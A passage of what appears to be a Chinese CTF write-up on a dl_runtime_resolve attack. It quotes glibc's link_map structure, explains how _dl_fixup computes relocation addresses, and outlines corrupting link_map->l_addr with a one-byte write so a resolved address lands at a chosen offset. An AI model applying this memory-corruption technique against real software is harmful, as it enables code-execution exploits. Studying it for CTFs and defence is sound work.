class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;	<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;		<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;		<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;		<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>			/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        lt_executable,		<span class="comment">/* The main executable program.  */</span></span><br><span class="line">            lt_library,		<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">            lt_loaded		<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">    &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;	<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;	<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_main_map:<span class="number">1</span>;  <span class="comment">/* Nonzero for the map of the main program.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_visited:<span class="number">1</span>;   <span class="comment">/* Used internally for map dependency</span></span><br><span class="line"><span class="comment">				   graph traversal.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_map_used:<span class="number">1</span>;  <span class="comment">/* These two bits are used during traversal */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_map_done:<span class="number">1</span>;  <span class="comment">/* of maps in _dl_close_worker. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">					to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br><span class="line"><span class="comment">				      the l_libname list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;	<span class="comment">/* Nonzero if this is a faked descriptor</span></span><br><span class="line"><span class="comment">				   without associated file.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>; <span class="comment">/* Nonzero if GL(dl_init_static_tls)</span></span><br><span class="line"><span class="comment">				       should be called on this link map</span></span><br><span class="line"><span class="comment">				       when relocation finishes.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;	<span class="comment">/* Nonzero if the DSO is used in auditing.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>; <span class="comment">/* Nonzero if at least one audit module</span></span><br><span class="line"><span class="comment">				       is interested in the PLT interception.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;	<span class="comment">/* Nozero if the object cannot be used anymore</span></span><br><span class="line"><span class="comment">				   since it is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>; <span class="comment">/* Nonzero if inter-segment holes are</span></span><br><span class="line"><span class="comment">				    mprotected or if no holes are present at</span></span><br><span class="line"><span class="comment">				    all.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* Nonzero if l_local_scope</span></span><br><span class="line"><span class="comment">						 during LD_TRACE_PRELINKING=1</span></span><br><span class="line"><span class="comment">						 contains any DT_SYMBOLIC</span></span><br><span class="line"><span class="comment">						 libraries.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* Nonzero if l_initfini can be</span></span><br><span class="line"><span class="comment">				       freed, ie. not allocated with</span></span><br><span class="line"><span class="comment">				       the dummy malloc in ld.so.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_ld_readonly:<span class="number">1</span>; <span class="comment">/* Nonzero if dynamic section is readonly.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_find_object_processed:<span class="number">1</span>; <span class="comment">/* Zero if _dl_find_object_update</span></span><br><span class="line"><span class="comment">					       needs to process this</span></span><br><span class="line"><span class="comment">					       lt_library map.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* NODELETE status of the map.  Only valid for maps of type</span></span><br><span class="line"><span class="comment">       lt_loaded.  Lazy binding sets l_nodelete_active directly,</span></span><br><span class="line"><span class="comment">       potentially from signal handlers.  Initial loading of an</span></span><br><span class="line"><span class="comment">       DF_1_NODELETE object set l_nodelete_pending.  Relocation may</span></span><br><span class="line"><span class="comment">       set l_nodelete_pending as well.  l_nodelete_pending maps are</span></span><br><span class="line"><span class="comment">       promoted to l_nodelete_active status in the final stages of</span></span><br><span class="line"><span class="comment">       dlopen, prior to calling ELF constructors.  dlclose only</span></span><br><span class="line"><span class="comment">       refuses to unload l_nodelete_active maps, the pending status is</span></span><br><span class="line"><span class="comment">       ignored.  */</span></span><br><span class="line">    <span class="keyword">bool</span> l_nodelete_active;</span><br><span class="line">    <span class="keyword">bool</span> l_nodelete_pending;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link_map.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected results of relocation while profiling.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">        <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">        <span class="comment">/* CONCURRENCY <span class="doctag">NOTE:</span> This is used to guard the concurrent initialization</span></span><br><span class="line"><span class="comment">	 of the relocation result across multiple threads.  See the more</span></span><br><span class="line"><span class="comment">	 detailed notes in elf/dl-runtime.c.  */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> init;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pointer to the version information if available.  */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* String specifying the path where this object was found.  */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start and finish of memory map for this object.  l_map_start</span></span><br><span class="line"><span class="comment">       need not be the same as l_addr.  */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* End of the executable part of the mapping.  */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Default array for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* Size of array allocated for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* This is an array defining the lookup scope for this link map.</span></span><br><span class="line"><span class="comment">       There are initially at most three different scope lists.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A similar array, this time only with the local scope.  This is</span></span><br><span class="line"><span class="comment">       used occasionally.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This information is kept to check for sure whether a shared</span></span><br><span class="line"><span class="comment">       object is the same as one already loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RUNPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of object in order of the init and fini calls.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of the dependencies introduced through symbol binding.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">    &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nonzero if the DSO is used.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Various flag words.  */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Temporarily used in `dl_close&#x27;.  */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">        <span class="keyword">int</span> type_class;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Thread-local storage related info.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* Size of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* Size of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* Alignment requirement of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* Offset of first byte module alignment.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET	0</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">&quot;FORCED_DYNAMIC_TLS_OFFSET is not defined&quot;</span></span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* For objects present at startup time: offset in the static TLS block.  */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* Index of the module in the dtv array.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of thread_local objects constructed by this DSO.  This is</span></span><br><span class="line"><span class="comment">       atomically accessed and modified and is not always protected by the load</span></span><br><span class="line"><span class="comment">       lock.  See also: CONCURRENCY NOTES in cxa_thread_atexit_impl.c.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information used to change permission after the relocations are</span></span><br><span class="line"><span class="comment">       done.  */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>_dl_fixup</code> 将使用“链接映射”来确定“重定位索引”所指的符号，并提供大量其他需要的信息来进行符号解析，其中最重要的就是“解析地址”计算</p>
<ul>
<li><code>_dl_fixup</code> 利用存储在 <code>link_map</code> 中的信息来确定符号 <code>@got</code>（称为“解析地址”）的位置</li>
<li>如果我们欺骗 <code>_dl_fixup</code> 计算错误的解析地址并且 <code>write@got</code> 仍然是 <code>write@plt+6</code>，利用这一点将是有价值的，我们永远不会在字节写入后丢失 <code>_dl_fixup</code> 作为攻击面</li>
</ul>
<p>实现重定位的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset(pltgot, reloc_arg));</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
<p>当运行时加载器加载 ELF 时，它会通过 .dynamic 部分中的条目定位不同的数据结构，例如存储析构函数或 GOT 的位置，这是 .dynamic 部分的样子：</p>
<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661098830166-1661242874520.png" alt="1661098830166"> </p>
<p>.dynamic 段中往往保存着多个元素，元素的数据结构为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
<ul>
<li>d_tag：标签所做的只是描述值，告诉加载器 <code>d_un</code> 数据的意义，常见的类型如下表：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th><code>d_tag</code>类型</th>
<th><code>d_un</code>的定义</th>
</tr>
</thead>
<tbody>
<tr>
<td>DT_SYMTAB - 6</td>
<td>d_ptr 记录动态链接符号表(.dynsym)的地址偏移</td>
</tr>
<tr>
<td>DT_STRTAB - 5</td>
<td>d_ptr 记录动态链接字符串表(.dynstr)的地址偏移</td>
</tr>
<tr>
<td>DT_STRSZ - 10</td>
<td>d_val 记录动态链接字符串表(.dynstr)的大小</td>
</tr>
<tr>
<td>DT_HASH - 4</td>
<td>d_ptr 表示动态链接hash表(.hash)的地址</td>
</tr>
<tr>
<td>DT_SONAME - 14</td>
<td>本共享对象的SO-NAME</td>
</tr>
<tr>
<td>DT_RPATH - 15</td>
<td>动态链接共享对象的搜索路径</td>
</tr>
<tr>
<td>DT_INIT - 12</td>
<td>初始化代码地址</td>
</tr>
<tr>
<td>DT_FINIT - 13</td>
<td>结束代码地址</td>
</tr>
<tr>
<td>DT_NEED - 1</td>
<td>当前文件依赖的共享目标文件的文件名</td>
</tr>
<tr>
<td>DT_REL/DT_RELA - 17/7</td>
<td>动态链接重定位表地址</td>
</tr>
<tr>
<td>DT_RELAENT - 9</td>
<td>动态链接重定位表项的数目</td>
</tr>
</tbody>
</table>
</div>
<p>运行时，加载器将读取每个 Elf64_Dyn 条目，并在 ELF 的 <code>link_map</code> 中存储指向每个条目的指针（具体来说，指向每个 Elf64_Dyn 的指针将存储在 <code>link_map-&gt;l_info</code> 数组中，由标签索引）</p>
<ul>
<li>因此，加载器可以使用 <code>l-&gt;l_info[DT_XXX]</code> 访问对应的 Elf64_Dyn </li>
<li>例如：通过 <code>l-&gt;l_info[DT_STRTAB].d_un.d_ptr</code> 轻松读取 <code>DT_STRTAB</code> 的地址</li>
</ul>
<p>接下来就需要 [重定位表] 来索引目标的位置，每个条目都有一个 <code>r_offset</code> 属性，它指定符号的解析地址应该放在哪里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>
<p>看了下面这张图就明白了：</p>
<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661100223655-1661242874520.png" alt="1661100223655"> </p>
<ul>
<li>由于 <code>r_offset</code> 属性是一个偏移量而不是一个绝对指针，我们需要添加 <code>l-&gt;l_addr</code> 来获得解析地址，也就是如下代码的实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>当申请的堆块足够大时，可以申请到接近 libc 前面内存，有一次 WAA libc 的机会（只有1字节）</p>
<p>根据 <code>_dl_fixup_</code> 的寻址规则，我们在 <code>_dl_fixup_</code> 查找完函数地址回填到 GOT 表后，可以通过修改 <code>link_map-&gt;l_addr</code>，使回填的函数填到 <code>write@got</code> 某个偏移的地方（<code>bss-&gt;size</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*RDI  <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br></pre></td></tr></table></figure>
